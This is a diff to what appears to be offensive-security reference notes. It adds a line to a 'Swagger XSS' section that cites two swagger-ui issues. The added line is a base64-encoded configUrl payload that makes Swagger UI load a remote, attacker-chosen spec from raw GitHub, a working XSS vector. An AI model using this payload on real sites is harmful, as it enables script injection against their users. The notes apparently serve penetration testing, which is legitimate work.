@@ -189,6 +189,7 @@ done <$file
 **Swagger XSS**
 - https://github.com/swagger-api/swagger-ui/issues/3847
 - https://github.com/swagger-api/swagger-ui/issues/1262
+- `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlZXUtaW5zcGFjZS9lYXN5Zy9tYWluL1hTUyUyMGFsbCUyMHRoZSUyMHRoaW5ncy90ZXN0LnlhbWwiCn0=`
 
 **Cross Site Tracing**
 
